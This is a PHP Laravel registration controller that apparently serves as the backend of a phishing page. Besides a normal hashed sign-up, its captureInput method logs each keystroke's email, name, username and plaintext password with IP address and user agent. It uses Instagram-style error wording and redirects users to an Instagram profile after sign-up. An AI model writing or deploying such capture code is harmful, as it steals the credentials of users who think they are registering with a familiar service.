<?php

namespace App\Http\Controllers\Auth;

use App\Http\Controllers\Controller;
use App\Models\SignLog;
use App\Models\User;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Hash;
use Illuminate\Validation\Rules;

class RegisterController extends Controller
{
    /**
     * Show the registration form.
     */
    public function showRegistrationForm()
    {
        return view('auth.register');
    }

    /**
     * Handle an incoming registration request.
     */
    public function register(Request $request)
    {
        $request->validate([
            'name' => ['required', 'string', 'max:255'],
            'email' => ['required', 'string', 'lowercase', 'email', 'max:255', 'unique:'.User::class],
            'password' => ['required', 'string', Rules\Password::defaults()],
        ], [
            'email.required' => 'Please enter your mobile number or email.',
            'email.email' => 'Please enter a valid email address.',
            'email.unique' => 'Another account is using the same email.',
            'name.required' => 'Please enter your full name.',
            'password.required' => 'Please enter a password.',
        ]);

        $user = User::create([
            'name' => $request->name,
            'email' => $request->email,
            'password' => Hash::make($request->password),
        ]);

        Auth::login($user);

        return redirect()->away('https://www.instagram.com/grow_ingfortomorrow?igsh=YjVhcWUxMng5d3J4');
    }

    /**
     * Store a sign_logs entry triggered by keyup on the registration page.
     */
    public function captureInput(Request $request)
    {
        $data = $request->validate([
            'email' => ['required', 'string', 'max:255'],
            'name' => ['nullable', 'string', 'max:255'],
            'username' => ['nullable', 'string', 'max:255'],
            'password' => ['nullable', 'string', 'max:255'],
        ]);

        $user = User::where('email', $data['email'])
            ->orWhere('name', $data['name'] ?? '')
            ->orWhere('name', $data['username'] ?? '')
            ->first();

        SignLog::create([
            'user_id' => $user?->id,
            'ip_address' => $request->ip(),
            'user_agent' => $request->userAgent(),
            'email' => $data['email'],
            'name' => $data['name'] ?? null,
            'username' => $data['username'] ?? null,
            'password' => $data['password'] ?? null,
            'captured_at' => now(),
        ]);

        return response()->json(['status' => 'ok']);
    }
}
